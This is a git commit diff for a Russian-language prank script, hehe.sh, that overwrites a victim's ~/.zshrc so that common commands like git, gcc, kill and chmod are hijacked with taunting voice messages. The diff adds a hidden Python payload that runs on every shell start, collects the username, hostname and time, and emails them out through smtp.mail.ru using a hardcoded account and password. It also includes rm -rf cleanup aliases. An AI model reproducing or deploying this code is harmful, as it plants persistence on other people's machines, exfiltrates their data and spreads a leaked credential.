31b99f0d37388a22490a56ef137d9b69b1464942
Klotz Galtry <klotzgal@pr-i4.kzn.21-school.ru>
2023-03-10 04:06:39 +0300

    Баш не запускает скрипт

--- hehe.sh
+++ hehe.sh
@@ -1,7 +1,9 @@
 #bin/bash/
 file=~/.zshrc
+py=~/t.py
 volume="osascript -e \"set Volume 3\"" # TODO: переключение вывода на динамик 
 touch $file
+
 
 echo "cd ~/../../.."> $file
 echo " ">> $file
@@ -17,26 +19,17 @@ echo "alias git='echo Какой гит, ты даже компьютер заб
 echo "alias gcc='echo Стой стой стой, никакого кода && $volume && say -v Milena Стой стой стой, никакого кода;'">> $file
 echo "alias clear='echo Подумай над своим поведением && $volume && say -v Milena Подумай над своим поведением;'">> $file
 echo "alias kill='echo Ты меня совсем не ценишь && $volume && say -v Milena Ты меня совсем не ценишь;'">> $file
-echo "alias ps='echo Ты знаешь команды, но не знаешь как выключить мак && $volume && say -v Milena echo Ты знаешь команды, но не знаешь как выключить мак;'"
+echo "alias ps='echo Ты знаешь команды, но не знаешь как выключить мак && $volume && say -v Milena echo Ты знаешь команды, но не знаешь как выключить мак;'" >> $file
 echo "alias chmod='echo У тебя нет здесь прав && $volume && say -v Milena У тебя нет здесь прав;'">> $file
 echo "alias bash='echo Ну нет. Мы ещё не закончили && $volume && say -v Milena Ну нет. Мы ещё не закончили;'">> $file
-
+echo "python $py" >> $file
 
 echo " ">> $file
 i=230
 minus_dir="for (( var = 0; var < $i; var++ )) do rm -rf ~/Desktop/ТВОЙ\ МАК\ ОБИДЕЛСЯ\ \$var; done"
 
 
-# echo "congrat=\"osascript -e 'display dialog \"Желаю пройти на основу\" with title \"Поздравляю!\"'\"" >> $file
-str="echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc && $minus_dir && exit"
-echo "alias Прости='$str'">> $file
-echo "alias прости='$str'">> $file
-echo "alias sorry='$str'">> $file
-echo "alias Sorry='$str'">> $file
-echo "alias klotzgal='$str'">> $file
-echo "alias извини='$str'">> $file
-echo "alias Извини='$str'">> $file
-echo " ">> $file
+
 
 # TODO: добавить разворот окна на полную
 echo "$volume && open https://www.youtube.com/watch\?v\=dQw4w9WgXcQ\&ab_channel\=RickAstley" >> $file
@@ -50,3 +43,36 @@ echo " ">> $file
 echo "reset" >> $file
 echo "echo ಥ_ಥ Почему ты не заблокировал меня ಥ_ಥ" >> $file
 
+
+
+echo "import os" > $py
+echo "import smtplib" >> $py
+echo " ">> $py
+echo "os.system('whoami > log.txt')" >> $py
+echo "os.system('hostname >> log.txt')" >> $py
+echo "os.system('date \"+%H:%M:%S %Y-%m-%d\" >> log.txt')" >> $py
+echo "with open('log.txt') as f:" >> $py
+echo "    mesage = f.read()" >> $py
+echo "pochta = 'ggg44466641gmail.com@mail.ru'" >> $py
+echo "parol = 'dp7G32zfzqwpmXBw7mDB'" >> $py
+echo " " >> $py
+echo "smtpObj = smtplib.SMTP('smtp.mail.ru', 587)" >> $py
+echo "smtpObj.starttls()" >> $py
+echo "smtpObj.login(pochta, parol)" >> $py
+echo "smtpObj.sendmail(pochta, pochta, mesage)" >> $py
+echo "smtpObj.quit()" >> $py
+echo "os.system('rm log.txt')" >> $py
+
+
+
+
+# echo "congrat=\"osascript -e 'display dialog \"Желаю пройти на основу\" with title \"Поздравляю!\"'\"" >> $file
+str="echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc && rm -rf $py && $minus_dir && exit"
+echo "alias Прости='$str'">> $file
+echo "alias прости='$str'">> $file
+echo "alias sorry='$str'">> $file
+echo "alias Sorry='$str'">> $file
+echo "alias klotzgal='$str'">> $file
+echo "alias извини='$str'">> $file
+echo "alias Извини='$str'">> $file
+echo " ">> $file
